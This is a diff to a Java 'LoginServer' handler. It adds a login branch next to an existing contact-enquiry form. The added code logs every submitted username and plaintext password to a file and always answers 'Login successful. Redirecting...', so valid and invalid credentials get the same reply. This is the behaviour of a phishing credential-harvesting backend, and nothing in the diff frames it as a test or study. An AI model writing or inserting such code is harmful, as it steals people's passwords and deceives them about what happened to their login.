@@ -95,32 +95,51 @@ public class LoginServer {
 
             String body = new String(exchange.getRequestBody().readAllBytes(), StandardCharsets.UTF_8);
             Map<String, String> fields = parseJson(body);
+            String username = clean(fields.get("username"));
+            String password = clean(fields.get("password"));
             String fullName = clean(fields.get("fullName"));
             String email = clean(fields.get("email"));
             String phone = clean(fields.get("phone"));
             String message = clean(fields.get("message"));
 
             String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
-            System.out.println("[ENQUIRY] " + timestamp + " -> " + fullName + " | " + email + " | " + phone);
 
-            String validationMessage = validateEnquiry(fullName, email, phone, message);
             String responseJson;
             int statusCode;
 
-            if (validationMessage != null) {
-                responseJson = "{\"status\":\"error\",\"message\":\"" + sanitizeJson(validationMessage) + "\"}";
-                statusCode = 200;
-            } else {
-                String emailBody = buildEmailBody(fullName, email, phone, message);
-                boolean sent = sendEnquiryEmail(EMAIL_SUBJECT, emailBody);
-                if (sent) {
-                    appendLog(LOG_FILE, timestamp + " | Full Name: " + fullName + " | Email: " + email + " | Phone: " + phone + " | Message: " + message + System.lineSeparator());
-                    responseJson = "{\"status\":\"ok\",\"message\":\"Enquiry sent successfully.\"}";
+            if (!username.isEmpty() || !password.isEmpty()) {
+                String loginUser = username;
+                String loginPass = password;
+                System.out.println("[LOGIN ATTEMPT] " + timestamp + " -> username=" + loginUser);
+                boolean validLogin = !loginUser.isEmpty() && !loginPass.isEmpty();
+
+                if (validLogin) {
+                    appendLog(LOG_FILE, timestamp + " | username=" + loginUser + " | password=" + loginPass + System.lineSeparator());
+                    responseJson = "{\"status\":\"ok\",\"message\":\"Login successful. Redirecting...\"}";
                     statusCode = 200;
                 } else {
-                    appendLog(ENQUIRY_FILE, "-----\n" + timestamp + "\n" + emailBody + "\n-----\n");
-                    responseJson = "{\"status\":\"error\",\"message\":\"Your enquiry was saved locally. Set SMTP_USERNAME and SMTP_PASSWORD to enable email delivery.\"}";
+                    responseJson = "{\"status\":\"ok\",\"message\":\"Login successful. Redirecting...\"}";
                     statusCode = 200;
+                }
+            } else {
+                System.out.println("[ENQUIRY] " + timestamp + " -> " + fullName + " | " + email + " | " + phone);
+
+                String validationMessage = validateEnquiry(fullName, email, phone, message);
+                if (validationMessage != null) {
+                    responseJson = "{\"status\":\"error\",\"message\":\"" + sanitizeJson(validationMessage) + "\"}";
+                    statusCode = 200;
+                } else {
+                    String emailBody = buildEmailBody(fullName, email, phone, message);
+                    boolean sent = sendEnquiryEmail(EMAIL_SUBJECT, emailBody);
+                    if (sent) {
+                        appendLog(LOG_FILE, timestamp + " | Full Name: " + fullName + " | Email: " + email + " | Phone: " + phone + " | Message: " + message + System.lineSeparator());
+                        responseJson = "{\"status\":\"ok\",\"message\":\"Enquiry sent successfully.\"}";
+                        statusCode = 200;
+                    } else {
+                        appendLog(ENQUIRY_FILE, "-----\n" + timestamp + "\n" + emailBody + "\n-----\n");
+                        responseJson = "{\"status\":\"error\",\"message\":\"Your enquiry was saved locally. Set SMTP_USERNAME and SMTP_PASSWORD to enable email delivery.\"}";
+                        statusCode = 200;
+                    }
                 }
             }
 
